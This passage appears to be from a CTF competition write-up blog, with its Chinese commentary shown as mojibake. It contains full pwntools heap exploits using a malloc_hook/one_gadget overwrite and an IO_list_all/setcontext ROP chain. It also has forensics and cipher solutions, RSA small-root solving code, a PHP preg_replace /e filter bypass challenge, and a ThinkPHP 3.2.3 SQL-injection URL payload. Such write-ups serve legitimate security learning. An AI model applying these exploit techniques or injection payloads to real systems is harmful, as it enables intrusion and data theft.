cmd: gdb.attach(io, cmd) pause() else: gdb.attach(io) pause() def calculate_difference(x, y): return ((x - y) + 0x10000) % 0x10000 # äº¤äº’å‡½æ•° def send_menu_choice(choice): io.sendlineafter(\"Please input your choice:\", str(choice)) def add_entry(size, data='a'): send_menu_choice(1) io.sendlineafter(\"content:\", str(size)) io.sendafter(\"content: \", data) def show_entries(): send_menu_choice(2) def delete_entry(): send_menu_choice(3) def edit_entry(size, data): send_menu_choice(4) io.sendlineafter(\"content:\", str(size)) io.sendafter(\"content: \", data) # åˆå§‹åŒ– io.sendlineafter(\"name. \", b'aaaa') # æ¼æ´åˆ©ç”¨æµç¨‹ add_entry(0x50) add_entry(0x50) add_entry(0x58) payload = b'\\x00' * 0x58 + p64(0xee1) edit_entry(0x60, payload) add_entry(0xff0) add_entry(0x60) show_entries() base_address = u64(io.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) - 0x3c5161 io.recv(10) heap_base_address = u64(io.recv(6).ljust(8, b'\\x00')) - 0x120 malloc_hook_address = base_address + libc.sym['__malloc_hook'] free_hook_address = base_address + libc.sym['__free_hook'] realloc_hook_address = base_address + libc.sym['__realloc_hook'] IO_list_all_address = base_address + libc.sym['_IO_list_all'] payload = p64(malloc_hook_address - 0x23) delete_entry() edit_entry(0x20, payload) add_entry(0x68) one_gadgets = [0x45126, 0x4527a, 0xf03a4, 0xf1147] one_gadget_address = base_address + one_gadgets[2] add_entry(0x68, b'\\x00' * 0x13 + p64(one_gadget_address)) send_menu_choice(1) io.sendlineafter(\"content:\", str(0x20)) print(f'realloc_hook_address --&gt; 0x{realloc_hook_address:x}') print(f'malloc_hook_address --&gt; 0x{malloc_hook_address:x}') print(f'heap_base_address --&gt; 0x{heap_base_address:x}') print(f'base_address --&gt; 0x{base_address:x}') io.interactive() EzHeap ida64æ‰“å¼€é™„ä»¶åˆ†æ åœ¨ä¿®æ”¹å‡½æ•°é‡Œå‘ç°å‡½æ•°å­˜åœ¨å †æº¢å‡º ç”±äºç¨‹åºå¯ç”¨äº†æ²™ç®±å’Œä½ç½®æ— å…³æ‰§è¡Œï¼ˆPIEï¼‰ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆæ³„éœ²libcåœ°å€å’Œå †åœ°å€ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åŠ«æŒIO_list_allï¼Œä»¥ä¾¿å°†å…¶ä½œä¸ºå­˜å‚¨å’Œè¯»å–flagå­—ç¬¦ä¸²çš„åœ°å€ã€‚æœ€åï¼Œæˆ‘ä»¬é€šè¿‡åŠ«æŒç¬¬äºŒä¸ªlargebin chunkçš„sizeå­—æ®µï¼Œå°†æ‰§è¡Œæµç¨‹é‡å®šå‘åˆ°setcontextï¼Œä»¥ä¾¿è¯»å–flagã€‚ Expå¦‚ä¸‹ï¼š from pwn import * context(log_level='debug', arch='amd64') remote_address = \"8.147.133.76\" remote_port = 14438 libc_path = './libc.so.6' p = remote(remote_address, remote_port) libc = ELF(libc_path) def add_chunk(size, content): p.sendlineafter('choice &gt;&gt; ', '1') p.sendlineafter('size:', str(size)) p.sendafter('content:', content) def delete_chunk(index): p.sendlineafter('choice &gt;&gt; ', '2') p.sendlineafter('idx:', str(index)) def edit_chunk(index, size, content): p.sendlineafter('choice &gt;&gt; ', '3') p.sendlineafter('idx:', str(index)) p.sendlineafter('size:', str(size)) p.sendafter('content:', content) def show_chunk(index): p.sendlineafter('choice &gt;&gt; ', '4') p.sendlineafter('idx:', str(index)) for i in range(12): # Indices 0-11 add_chunk(0xe0, 'a') add_chunk(0x450, 'chunk_12') # Index 12 add_chunk(0x450, 'chunk_13') # Index 13 add_chunk(0x450, 'chunk_14') # Index 14 add_chunk(0x440, 'chunk_15') # Index 15 delete_chunk(13) add_chunk(0x460, 'chunk_16') # Index 16 edit_chunk(12, 0x500, b'a'*0x45f + b'b') show_chunk(12) p.recvuntil(b'ab') libc_base = u64(p.recvuntil(b'\\x7f').ljust(8, b'\\x00')) - 0x21B0E0 log.success('libc_base: {}'.format(hex(libc_base))) key_gadget = libc_base + 0x0000000000167420 pop_rdi = libc_base + 0x000000000002a3e5 pop_rsi = libc_base + 0x000000000002be51 pop_rdx2 = libc_base + 0x000000000011f2e7 read_addr = libc_base + libc.sym['read'] open_addr = libc_base + libc.sym['open'] write_addr = libc_base + libc.sym['write'] setcontext = libc_base + libc.sym['setcontext'] syscall_ret = libc_base + 0x91316 pop_rax = libc_base + 0x0000000000045eb0 ret = libc_base + 0x0000000000029139 edit_chunk(12, 0x500, b'a'*0x46f + b'b') show_chunk(12) p.recvuntil(b'ab') heap_base = u64(p.recv(6).ljust(8, b'\\x00')) - 0x26F0 log.success('heap_base: {}'.format(hex(heap_base))) IO_list_all = libc_base + 0x21B680 flag_str_addr = heap_base + 0x3CF0 flag_content_addr = heap_base + 0x200 payload = b'./flag'.ljust(8, b'\\x00') payload += p64(pop_rdi) + p64(flag_str_addr) payload += p64(pop_rax) + p64(2) + p64(syscall_ret) payload += p64(pop_rdi) + p64(3) payload += p64(pop_rsi) + p64(flag_content_addr) payload += p64(pop_rdx2) + p64(0x50) + p64(0) + p64(read_addr) payload += p64(pop_rdi) + p64(1) payload += p64(pop_rsi) + p64(flag_content_addr) payload += p64(pop_rdx2) + p64(0x50) + p64(0) + p64(write_addr) payload = payload.ljust(0x450, b'\\x00') payload += p64(0) + p64(0x461) payload += p64(libc_base + 0x21B0E0) * 2 payload += p64(heap_base + 0x26F0) + p64(IO_list_all - 0x20) edit_chunk(12, 0x500, payload) payload_context = flat({ 0x20: setcontext + 61, 0x68: flag_str_addr, 0xa0: heap_base + 0x22A8, 0xa8: ret }, filler=b'\\x00') add_chunk(0x460, payload_context) fake_io_file = heap_base + 0x2FB0 _IO_wfile_jumps = libc_base + 0x2170C0 payload_fake_io = flat({ 0xa0 - 0x10: fake_io_file - 0x50, 0xd8 - 0x10: _IO_wfile_jumps, 0xd0 - 0x50: fake_io_file + 0x28 - 0x68, 0x18: key_gadget }, filler=b'\\x00') edit_chunk(15, 0x500, payload_fake_io) delete_chunk(15) add_chunk(0x470, './flag') payload_large_bin = b'\\x00'*0x450 + p64(0) + p64(heap_base + 0x3880) payload_large_bin += p64(0) * 3 + p64(key_gadget) edit_chunk(14, 0x500, payload_large_bin) pause() p.sendlineafter('choice &gt;&gt; ', '5') p.interactive() 0x04 Misc ç«é”…é“¾è§‚å…‰æ‰“å¡ Power Trajectory Diagram åˆ†æçŸ¥é“å¯èƒ½æ˜¯å‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ° ç”¨è„šæœ¬ç»˜å›¾ import numpy as np import matplotlib.pyplot as plt # åŠ è½½æ·±åº¦å›¾æ•°æ® depthmap = np.load('trace.npy') # æ˜¾ç¤ºæ·±åº¦å›¾ plt.imshow(depthmap, cmap='viridis') # ä½ å¯ä»¥é€‰æ‹©å…¶ä»–é¢œè‰²æ˜ å°„ï¼Œæ¯”å¦‚ 'gray', 'jet', 'plasma' ç­‰ plt.colorbar() # æ˜¾ç¤ºé¢œè‰²æ¡ # ä¿å­˜æ·±åº¦å›¾ plt.savefig('depthmap.jpg') # æ˜¾ç¤ºæ·±åº¦å›¾ plt.show() å¾—åˆ°å›¾ç‰‡ï¼Œå–æ ·å¾—å¯†ç  import numpy as np # æ­£ç¡®è®¾ç½®æ–‡ä»¶è·¯å¾„ file_path = r\"C:\\Users\\angel\\Desktop\\attachment.npz\\output.npy\" # æ›¿æ¢ä¸ºæ‚¨çš„æ–‡ä»¶è·¯å¾„ # åŠ è½½ npy æ–‡ä»¶ data = np.load(file_path, allow_pickle=True) # æ‰“å°æ•°æ®çš„ç±»å‹å’Œå†…å®¹ print(type(data)) print(data) # å‡è®¾ `data` æ˜¯ä¸€ä¸ªæ™®é€šçš„ numpy æ•°ç»„ trace_data = data # è®¾ç½®æ¯ç»„åŒ…å«çš„è½¨è¿¹æ•°é‡ traces_per_group = 40 # å‡½æ•°ï¼šè®¡ç®—ä¸åŒç»„å…¶ä»–è½¨è¿¹çš„å‡æ–¹å·® def mean_squared_difference(trace, group): sum_diff = 0 for other_trace in group: if not np.array_equal(trace, other_trace): sum_diff += np.mean((trace - other_trace) ** 2) return sum_diff / (len(group) - 1) # å­˜å‚¨æ¯ç»„ä¸­å·®å¼‚æœ€å¤§çš„è½¨è¿¹ç¼–å· distinct_traces = [] # æŒ‰ç»„å¤„ç†è½¨è¿¹ for i in range(0, len(trace_data), traces_per_group): group = trace_data[i:i + traces_per_group] max_diff = 0 distinct_trace_index = i # åˆå§‹åŒ–ä¸ºç»„ä¸­çš„ç¬¬ä¸€ä¸ªè½¨è¿¹ # å¯¹äºæ¯ç»„ä¸­çš„æ¯æ¡è½¨è¿¹ for j, trace in enumerate(group): diff = mean_squared_difference(trace, group) if diff &gt; max_diff: max_diff = diff distinct_trace_index = i + j distinct_traces.append(distinct_trace_index) print(distinct_traces) # ç»™å®šçš„åè¿›åˆ¶æ•°åˆ—è¡¨ numbers = [36, 42, 88, 138, 162, 213, 276, 308, 346, 388, 430, 476, 494] # ç»™å®šçš„å­—ç¬¦é›† a = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '!', '@', '#'] # è®¡ç®—æ¯ä¸ªæ•°å­—æ¨¡ 40 mod_40_numbers = [num % 40 for num in numbers] # æ‰“å°è½¬æ¢åçš„å­—ç¬¦ for i in range(len(mod_40_numbers)): print(a[mod_40_numbers[i]], end='') é€šé£æœº å¾—åˆ°mwpæ–‡ä»¶ï¼Œgoogleæœä¸€ä¸‹å¦‚ä½•æ‰“å¼€ äº†è§£ä¸€ç•ªï¼Œå‘ç°ä½¿ç”¨micro/winå·¥å…·æ‰“å¼€ å‘ç°å·¥å…·æ‰“ä¸å¼€ï¼Œæ¥ç€ç”¨010æ‰“å¼€åˆ†æï¼Œå¦‚ä¸‹å›¾å‘ç°æ–‡ä»¶å¤´æœ‰ç¼ºå¤±ï¼Œå°è¯•ä¿®æ”¹æ–‡ä»¶å¤´ æ·»åŠ æ–‡ä»¶å¤´ä¹‹åï¼Œå‘ç°æˆåŠŸæ‰“å¼€ï¼Œæµè§ˆå·¥å…·ï¼Œå‘ç°ç¬¬äºŒä¸ªtableå­˜åœ¨base64å­—ç¬¦ä¸²ï¼Œè§£ç å³å¯ base64è§£ç å³å¯ ç¥ç§˜æ–‡ä»¶ çœ‹ä¸€ä¸‹pptçš„å±æ€§ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªbifidcipherï¼Œç”¨cyberchefç›´æ¥è§£ Part1:flag{e æ‰“å¼€é™„ä»¶ï¼Œæ˜¯ä¸ªpptï¼Œå…ˆçœ‹ä¸€ä¸‹ï¼Œå‘ç°ç¬¬äºŒå¼ pptä¸Šæœ‰ä¸€ä¸ªä¸œè¥¿ï¼Œ Pptè½¬æ¢æˆZipè§£å‹ï¼Œæ‰¾åˆ°.docæ–‡ä»¶ ç„¶åç›´æ¥å‡¯æ’’å¯†ç ï¼Œä½ç§»=10ï¼Œå†è§£å¯†base64ï¼Œ part2:675efb ï¼Œpptç¬¬ä¸‰å¼ å›¾ç‰‡ base64è§£ç  PaRt4:6f-40 ç¬¬å››å¼ ç¼©æ”¾çœ‹æ‰¹æ³¨ Vigenere cipherè§£å¯†ï¼Œå¯†ç æ˜¯furry PARt10:9} ç¬¬äº”å¼ çš„å¤‡æ³¨ï¼Œæœ‰ä¸€ä¸ªä¸€ç›´base64è§£ç  pArt5:5f-90d ppt\\mediaç›®å½•ä¸‹æœ‰å¾ˆå¤šçº¿ç´¢ ä¸²èµ·æ¥å†base64è§£ç  ParT6:d-2 Image55.jpgçš„åº•éƒ¨ä¹Ÿæœ‰ä¸€æ®µ æ•²å‡ºæ¥åbase64è§£ç  parT9:dee ppt/slideLayouts/slideLayout2.xmlæ–‡ä»¶ä¸­ï¼Œå¾ˆæ˜æ˜¾çš„çº¿ç´¢ï¼Œc1GFSbd3Dg6BODbdl Remove Allï¼šâ€™B â€™/â€™bâ€™ /â€™1 â€™/â€™3â€™ å°†å¯¹åº”å­—ç¬¦å»é™¤åcGFSdDg6ODdl Base64è§£ç å paRt8:87e pt/slides/slide4.xmlæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸œè¥¿ï¼Œå…·ä½“å¦‚ä¸‹ ç„¶åå°†å…¶rot13ä¹‹åï¼Œå†base64è§£ç  PART7=22b3 å†çœ‹åˆ°è§£å‹å‡ºæ¥çš„æ–‡ä»¶ä¸­ï¼Œå«æœ‰ä¸€ä¸ªbinæ–‡ä»¶ï¼Œå°±æ˜¯å®ä»£ç ï¼Œä¸¢è¿›æ²™ç®±è¿˜åŸå‡ºå®ä»£ç æ˜¯ä»€ä¹ˆ Sub crypto(sMessage, strKey) Dim kLen, x, y, i, j, temp Dim s(256), k(256) kLen = Len(strKey) For i = 0 To 255 s(i) = i k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) Next j = 0 For i = 0 To 255 j = (j + k(i) + s(i)) Mod 256 temp = s(i) s(i) = s(j) s(j) = temp Next x = 0 y = 0 For i = 1 To 3072 x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp Next For i = 1 To Len(sMessage) x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp crypto = crypto &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; \",\" Next 'i13POMdzEAzHfy4dGS+vUA==(After base64) End Sub è¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰å¯†é’¥çš„rc4å¯†ç ï¼Œä¸¢è¿›cyberchefé‡Œé¢è§£ PArt3:3-34 flag{e675efb3-346f-405f-90dd-222b387edee9} ç›—ç‰ˆè½¯ä»¶ ä¸‹è½½é™„ä»¶ï¼Œå‘ç°hackexe.exeå’Œ3842.dmpï¼Œç»“åˆé¢˜ç›®å‘ç°æ˜¯å†…å­˜å–è¯ï¼Œéœ€è¦æ‹¿åˆ°åŸŸåå’ŒIPï¼Œæ¥ç€æˆ‘è¿è¡Œäº†ä¸€ä¸‹exeæ–‡ä»¶ï¼Œå‘ç°ç»™æˆ‘å¼¹å‡ºäº†ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªexeæ–‡ä»¶å’Œpngå›¾ç‰‡ï¼Œçœ‹ä¸€ä¸‹å›¾ç‰‡æœ‰æ²¡æœ‰éšå†™ï¼Œå‘ç°æ˜¯é€šé“éšå†™ ä»è¿™é‡Œpkçœ‹å‡ºæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒæŠŠä»–ä¿å­˜ä¸‹æ¥åè§£å‹ï¼Œè·å¾—ä¸€ä¸²æ˜æ–‡ï¼š r()J$nEA'r!!#;^5u:HM1\"'W(Mc*q[&lt;_/-H(eBQ_+@m$P8kMf4a[h&gt;1:e3=VX?9p=!\\&gt;H[_9!-P!Q!d_;F+/NMc([U69Id&gt;ct7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb\"[QMa/CV!RTk-8H6e+1!)_&gt;1l+['ejqO2X?j\\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j\"Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\\Sls57!F=^\"@S''W'hs8Q@r^3=WR?SaG;!'sXWM&lt;7?[m%=@Z!(i%/8\\&gt;*)+T!Ns8F&amp;Q@8VuM%M=EmC9Qqfgs4'f\"l=^2!!!$.f\\g`/F!&lt;:Sa$:.up:ei;_=uM8s?B6!-g;i^eq%6+WJ\\FCG4\"Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC'6h)8;[..\\cUR+?iSZ/p],bC8;\"i'?A\\Aj5XAOd!\"],16!-[7njkLW6+U0o;s\"&amp;08;Y5UM8r=Fa[q?Y8;Z%kM&gt;9HK!nkY%s4)bs!.?7t6!%3&amp;!'gMa6!.k%&gt;!]_-0+Tc:eQ5m&gt;\\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\\ base85è§£å¯†ä¸å‡ºæ¥ï¼Œæƒ³ç€è·å–ipï¼Œç„¶åæŠŠä»–ä¿å­˜ä¸ºbinæ–‡ä»¶åˆ†æï¼Œæ”¾åˆ°æ²™ç®±é‡Œ è·å–åˆ°äº†ip:39.100.72.235 ç„¶åçœ‹é‚£ä¸ªdmpæ–‡ä»¶ï¼Œå°†å…¶è½¬ä¸ºtxtæ–‡ä»¶ ä½¿ç”¨æŒ‡ä»¤cat res.txt | grep http |grep -I processè¿›è¡Œåˆ†æ æ‰¾åˆ°äº†åŸŸå ç„¶åmd5{winhack.com39.100.72.235} MD5åå¾—åˆ°flagã€‚ 0x05 crypto å¤å…¸å¯†ç  é¢˜ç›®ç»™çš„ï¼šAnU7NnR4NassOGp3BDJgAGonMaJayTwrBqZ3ODMoMWxgMnFdNqtdMTM9 æƒ³åˆ°Atbash Cipherç¼–ç ï¼Œå°è¯•æ‹¿åˆ°cyberchefè§£ç  è¿™é‡Œåœ¨ç»è¿‡base64è§£å¯†å³å¯ï¼Œå‘ç°ç»“æœå­˜åœ¨åç§»ï¼Œæƒ³åˆ°æ …æ è§£å¯†ï¼Œç›´æ¥ç½‘ç«™è§£å¯†å³å¯ OvO from Crypto.Util.number import * from secret import flag nbits = 512 p = getPrime(nbits) q = getPrime(nbits) n = p * q phi = (p-1) * (q-1) while True: kk = getPrime(128) rr = kk + 2 e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1 if gcd(e, phi) == 1: break m = bytes_to_long(flag) c = pow(m, e, n) e = e &gt;&gt; 200 &lt;&lt; 200 print(f'n = {n}') print(f'e = {e}') print(f'c = {c}') \"\"\" n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967 e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104 c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823 \"\"\" æ ¹æ®é¢˜ç›®ç»™çš„ä»£ç ï¼Œå¯ä»¥åˆ†æå‡ºï¼š è¿™æ®µä»£ç çš„ç›®çš„æ˜¯ç”Ÿæˆä¸€ä¸ªRSAåŠ å¯†ç³»ç»Ÿçš„å¯†é’¥ï¼Œå¹¶ä½¿ç”¨è¯¥å¯†é’¥å¯¹ä¸€ä¸ªæ¶ˆæ¯ï¼ˆflagï¼‰è¿›è¡ŒåŠ å¯† ä»”ç»†åˆ†æå°±èƒ½çŸ¥é“ï¼Œè¿™é‡Œå­˜åœ¨ç¼ºé™·ï¼š å¯†é’¥ç”Ÿæˆçš„å¤æ‚æ€§ï¼šç”±äº e çš„ç”Ÿæˆæ–¹å¼è¾ƒä¸ºå¤æ‚ï¼ŒåŒ…å«äº†å¤šä¸ªå¤§æ•°çš„è¿ç®—ï¼Œå¢åŠ äº†é€†å‘å·¥ç¨‹çš„éš¾åº¦ã€‚ è°ƒæ•´e çš„ä½æ“ä½œï¼šè¿™ç§ä½æ“ä½œä½¿å¾—æ¢å¤åŸå§‹çš„ æ›´ä¸ºå›°éš¾ï¼Œä½†ç”±äºä½200ä½çš„æ¸…é›¶æ˜¯å·²çŸ¥æ“ä½œï¼Œå¯èƒ½è¿˜æ˜¯æœ‰æ½œåœ¨çš„åˆ†ææ”»å‡»é€”å¾„ã€‚ ç¢°å·§ä¸Šæ¬¡æ¯”èµ›è§è¿‡ç±»ä¼¼é¢˜ç›®ï¼Œç›´æ¥ç”¨sagemathæ•°å­¦åº“å†™ï¼šåˆ©ç”¨ç»™å®šçš„RSAå…¬é’¥å‚æ•°ï¼Œå°è¯•æ¢å¤RSAå¯†é’¥ä¸­çš„ç´ æ•°pï¼Œåˆ©ç”¨å°æ ¹æ±‚è§£å’Œå¤šé¡¹å¼ ç›®çš„å°±æ˜¯ï¼š å¤šé¡¹å¼æ±‚æ ¹æ–¹æ³•ï¼šåˆ©ç”¨å¤šé¡¹å¼çš„å°æ ¹æ±‚è§£æŠ€æœ¯ï¼Œé€šè¿‡é«˜ä½éƒ¨åˆ†çš„çŒœæµ‹ï¼Œé€æ­¥é€¼è¿‘å®é™…ç´ æ•° ğ‘ å°æ ¹æ±‚è§£ï¼šé€šè¿‡ LLL ç®—æ³•ç­‰æ•°è®ºæŠ€æœ¯ï¼Œæ‰¾åˆ°æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„å°æ ¹ã€‚ å…¬é’¥æŒ‡æ•°çš„ç»“æ„ï¼šç”±äºå…¬é’¥æŒ‡æ•° e çš„ç”ŸæˆåŒ…å«äº†ç´ æ•° på’Œ q çš„ä¿¡æ¯ï¼Œè¿™æä¾›äº†é€†å‘å·¥ç¨‹çš„çº¿ç´¢ã€‚ æœ€ç»ˆå¯ä»¥ä»RSAå‚æ•°ä¸­æ¢å¤å¾—åˆ°åŸå§‹p from tqdm import tqdm from Crypto.Util.number import * from sage.all import PolynomialRing, Zmod, RealField, ZZ, gcd def find_full_potential_prime(p_high, modulus, exp_high, bit_length): # åˆ›å»ºä¸€ä¸ªå¤šé¡¹å¼ç¯ï¼Œå¹¶å®šä¹‰å¤šé¡¹å¼ PR.&lt;x&gt; = PolynomialRing(Zmod(modulus)) polynomial = x + p_high polynomial = polynomial.monic() # å¯»æ‰¾å¤šé¡¹å¼çš„å°æ ¹ roots = polynomial.small_roots(X=2**(bit_length + 4), beta=0.4) if roots: x0 = roots[0] potential_prime = gcd(x0 + p_high, modulus) return ZZ(potential_prime) def find_p_high(exp_high, modulus, bit_length): k = exp_high // modulus - 2 j = 65538 + (k + 2) * modulus + (k + 2) PR.&lt;X&gt; = PolynomialRing(RealField(1000)) polynomial = exp_high * X - (2 * (k + 1) * X^2 + (k + 2) * modulus + j * X) results = polynomial.roots() if results: for root in results: p_high = int(root[0]) &gt;&gt; 4 &lt;&lt; 4 potential_prime = find_full_potential_prime(p_high, modulus, exp_high, bit_length) if potential_prime and potential_prime != 1: return potential_prime # å®šä¹‰å‚æ•° n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967 e_high = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104 c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823 bit_length = 200 # ä½æ•° # æŸ¥æ‰¾ p p = find_p_high(e_high, n, bit_length) print(\"Potential prime p:\", p) å¾—åˆ°P1ï¼Œç»§ç»­é€šè¿‡ç´ æ•°pä»¥åŠå…¶ä»–çš„RSAå‚æ•°æ¥æ¢å¤ç§é’¥ï¼Œæœ€ç»ˆè§£å¯†å¯†æ–‡ from Cryptodome.Util.number import long_to_bytes, inverse from sympy import nextprime # å®šä¹‰å‚æ•° p1 = 9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091 n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967 e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104 c1 = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823 # æ‰“å° p1 print(\"p1:\", p1) # è®¡ç®— q q = n // p1 print(\"q:\", q) # è®¡ç®— phi phi = (p1 + 1) * (q + 1) print(\"phi:\", phi) # æ‰“å° e // phi print(\"e // phi:\", e // phi) # è®¡ç®— k k = 331118458487559161870846961263454730636 k = nextprime(k) print(\"next prime k:\", k) # è®¡ç®— e1 e1 = 65537 + k * p1 + (k + 2) * phi + 1 print(\"e1:\", e1) # è®¡ç®— d d = inverse(e1, (p1 - 1) * (q - 1)) print(\"d:\", d) # è§£å¯†æ¶ˆæ¯ decrypted_message = long_to_bytes(pow(c1, d, n)) print(\"Decrypted message:\", decrypted_message)","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"H&NCTF2024","path":"/2024/05/12/h-nctf2024/","content":"WEB-Please_RCE_Me &lt;?php if($_GET['moran'] === 'flag'){ highlight_file(__FILE__); if(isset($_POST['task'])&amp;&amp;isset($_POST['flag'])){ $str1 = $_POST['task']; $str2 = $_POST['flag']; if(preg_match('/system|eval|assert|call|create|preg|sort|{|}|filter|exec|passthru|proc|open|echo|`| |\\.|include|require|flag/i',$str1) || strlen($str2) != 19 || preg_match('/please_give_me_flag/',$str2)){ die('hacker!'); }else{ preg_replace(\"/please_give_me_flag/ei\",$_POST['task'],$_POST['flag']); } } }else{ echo \"moran want a flag.&lt;/br&gt;(?moran=flag)\"; } åˆ©ç”¨åŠ¨æ€å‡½æ•°+æ­£åˆ™ç»•è¿‡ï¼Œæ­£åˆ™ç”¨å¤§å†™ç»•è¿‡å³å¯ WEB-ez_tp ä»£ç å®¡è®¡ï¼Œå‘ç°nameå‚æ•°å­˜åœ¨tp3.2.3 expçš„sqlæ³¨å…¥ï¼Œè¿™é‡Œç”¨è”åˆæ³¨å…¥å³å¯ è‡³äºwafè¿™é‡Œè¿‡æ»¤çš„ä¸ä¸¥æ ¼ï¼Œå¾ˆç®€å•ï¼Œå®šä½è¿™é¢˜çš„æ§åˆ¶å‡½æ•°ï¼Œpayloadå¦‚ä¸‹ è¿™é‡Œå‡½æ•°æ˜¯h_n url/index.php/home/index/h_n?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag è¿™é‡Œç”±äºè¿˜æ£€æŸ¥äº†cookieå¤´ï¼Œç”¨bpåˆ ä¸€äº›è¿‡æ»¤å­—ç¬¦å³å¯ è¿™é‡Œå†å¤ç°ä¸€æ³¢tpï¼Œä¸è¿‡æ˜¯ç®€å•çš„å¤ç°ï¼Œåé¢å­¦PHPä»£å®¡çš„æ—¶å€™å†ç»†çœ‹ è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œè¿‡äº†wafå°±æ‰§è¡Œelseï¼Œé‡Œé¢æ˜¯ ç”¨äºè·å–è¾“å…¥æ•°æ®ï¼Œå¦‚ $_GETã€$_POSTã€$_REQUESTã€$_SESSIONã€$_COOKIE ç­‰è¶…å…¨å±€æ•°ç»„ä¸­çš„æ•°æ®ã€‚è¿™ä¸ªæ–¹æ³•ä¸»è¦ç”¨äºç®€åŒ–å’ŒåŠ å¼ºå¯¹è¾“å…¥æ•°æ®çš„å¤„ç†ï¼Œæä¾›äº†ä¸€ç§æ›´å®‰å…¨ã€æ›´ä¾¿æ·çš„æ–¹å¼æ¥è®¿é—®ç”¨æˆ·è¾“å…¥ã€‚ åŸºæœ¬ç”¨æ³• I() æ–¹æ³•çš„åŸºæœ¬ç”¨æ³•å¦‚ä¸‹ï¼š $data = I('å˜é‡ç±»å‹.å˜é‡å/è¿‡æ»¤æ–¹æ³•/é»˜è®¤å€¼', é»˜è®¤å€¼, è¿‡æ»¤æ–¹æ³•); å˜é‡ç±»å‹ï¼šæŒ‡å®šè¦è·å–çš„æ•°æ®çš„ç±»å‹ï¼Œå¦‚ getã€postã€sessionã€cookie ç­‰ã€‚å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸º paramï¼Œè¡¨ç¤ºæŒ‰ç…§ GETã€POST å’Œ COOKIE çš„é¡ºåºæŸ¥æ‰¾ã€‚ å˜é‡åï¼šè¦è·å–çš„å˜é‡çš„åç§°ã€‚ è¿‡æ»¤æ–¹æ³•ï¼šå¯¹è¾“å…¥æ•°æ®è¿›è¡Œè¿‡æ»¤çš„æ–¹æ³•ï¼Œå¯ä»¥æ˜¯ PHP çš„å†…ç½®å‡½æ•°åï¼Œæˆ–è€…æ›´å¤æ‚çš„è¿‡æ»¤è§„åˆ™ã€‚==å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä½¿ç”¨æ¡†æ¶çš„å…¨å±€è¿‡æ»¤æ–¹æ³•ï¼Œé€šå¸¸æ˜¯== ==htmlspecialchars==ã€‚ é»˜è®¤å€¼ï¼šå¦‚æœæŒ‡å®šçš„è¾“å…¥æ•°æ®ä¸å­˜åœ¨æ—¶è¿”å›çš„é»˜è®¤å€¼ã€‚ ç¤ºä¾‹ï¼š // è·å–GETå‚æ•°idï¼Œä¸å­˜åœ¨æ—¶é»˜è®¤ä¸º1 $id = I('get.id', 1); // 